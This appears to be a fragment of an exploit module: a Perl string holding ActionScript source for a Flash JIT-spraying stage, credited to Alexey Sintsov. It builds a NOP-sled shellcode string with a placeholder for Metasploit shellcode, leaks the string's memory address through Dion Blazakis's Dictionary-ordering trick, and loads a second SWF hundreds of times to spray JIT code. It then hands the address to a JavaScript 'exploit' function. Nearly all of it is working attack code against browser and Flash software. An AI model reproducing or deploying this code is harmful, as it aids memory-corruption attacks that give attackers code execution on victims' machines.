our $payl2="// Sprayng JIT.swf\n".
"// \n".
"// Spraing JIT stage-0 shellcode\n".
"//\n".
"// Calc pointer on string shellcode from MetaSploit\n".
"// return pointer to JavaScript sploit.\n".
"//\n".
"//  By Alexey Sintsov\n".
"//	dookie@inbox.ru\n".
"//	a.sintsov@dsec.ru\n".
"//\n".
"//	DSecRG - Digital Security Research Group [dsecrg.com]\n".
"//\n".
"package\n".
"{\n".
"    \n".
"	import flash.display.*;\n".
"	import flash.net.*;\n".
"    import flash.text.TextField;\n".
"    import flash.text.TextFieldType;\n".
"	import flash.system.Security;\n".
"	import flash.external.ExternalInterface;\n".
"	import flash.utils.*;\n".
"	\n".
"    public class Loadzz1 extends MovieClip\n".
"    {\n".
"	\n".
"		var MyTextField1:TextField = createTextField(10, 40, 300, 20);\n".
"		var MyTextField2:TextField = createTextField(10, 80, 300, 20);\n".
"		var childRef:DisplayObject = null;\n".
"	\n".
"		var shellcode:String = new String();\n".
"	\n".
"		var addr1=0;\n".
"		var ic=0;\n".
"		var ldInt;\n".
"		\n".
"		private function createTextField(x:Number, y:Number, width:Number, height:Number):TextField {\n".
"            var result:TextField = new TextField();\n".
"            result.x = x;\n".
"            result.y = y;\n".
"            result.width = width;\n".
"            result.height = height;\n".
"            result.background = true;\n".
"            result.border = true;\n".
"            addChild(result);\n".
"            return result;\n".
"        }\n".
"\n".
"	\n".
"		function pageLoadEx()\n".
"		{\n".
"						\n".
"		    var ldr = new Loader();\n".
"			var url = \"jit_s0.swf\";\n".
"			var urlReq = new URLRequest(url);\n".
"            ldr.load(urlReq);\n".
"			childRef = addChild(ldr); \n".
"            \n".
"			\n".
"		}\n".
"		function pageLoad()\n".
"		{\n".
"		    \n".
"			for(var z=0;z<600;z++){pageLoadEx();}\n".
"			ic=ic+1;\n".
"			MyTextField1.text=ic+\" - JIT spraying, wait for 4 ...\";\n".
"			if(ic==4)\n".
"				{\n".
"					clearInterval(ldInt);\n".
"					MyTextField1.text=ic+\" - done, calling sploit...\";\n".
"					ExternalInterface.call(\"exploit\", addr1);\n".
"				}\n".
"		}\n".
"		function metaShell() {\n".
"		\n".
"			\n".
"		\n".
"			for (var i = 0; i< 100; i++)\n".
"			{\n".
"				shellcode=shellcode+'\\u9090';\n".
"			}\n".
"			\n".
"			//shellcode from MetaSploit\n".
"			%31337%\n".
"			}\n".
" \n".
"			//for slow CPU need to make timeout or within 15 sec will kill it\n".
"			//Function's code by Dion Blazakis \n".
"			function objToPtr(obj) {\n".
"			var i;\n".
"			var even = new Dictionary();\n".
"			var odd = new Dictionary();\n".
" \n".
"		\n".
"			for (i = 0; i < (1024 * 1024 * 8); i += 1) {\n".
"				even[i * 2] = i;\n".
"				odd[i * 2 + 1] = i;\n".
"			}\n".
" \n".
" \n".
"			even[obj] = false;\n".
"			odd[obj] = false;\n".
" \n".
"			var evenPrev = 0;\n".
"			var oddPrev = 0;\n".
"			var curr;\n".
" \n".
"			for (curr in even)\n".
"			{\n".
"				if (curr == obj) { break; }\n".
"				evenPrev = curr;\n".
"			}\n".
" \n".
"  \n".
"			for (curr in odd)\n".
"			{\n".
"					if (curr == obj) { break; }\n".
"					oddPrev = curr;\n".
"			}\n".
" \n".
"			var ptr;\n".
"			if (evenPrev < oddPrev) {\n".
"			ptr = evenPrev;\n".
"			if (evenPrev + 8 + 9 != oddPrev) {\n".
"				return 0;\n".
"			}\n".
"			} else {\n".
"			ptr = oddPrev;\n".
"				if (oddPrev + 8 + 9 != evenPrev) {\n".
"					return 0;\n".
"				}\n".
"			}\n".
"			ptr = (ptr + 1) * 8;\n".
" \n".
"			return ptr;\n".
"		}\n".
"	\n".
"		function Loadzz1()\n".
"		{\n".
"		    \n".
"            Security.allowDomain(\"*\");\n".
"			MyTextField1.type = TextFieldType.DYNAMIC;\n".
"			\n".
"			\n".
"			metaShell();\n".
"			addr1=objToPtr(shellcode);\n".
"			addr1=addr1+0xC;\n".
"			MyTextField2.text=addr1+\" - shellcode addrz (dec)\";\n".
"			ldInt=setInterval(pageLoad,3500);\n".
"			    \n".
"		}\n".
"    }\n".
"}\n".
"";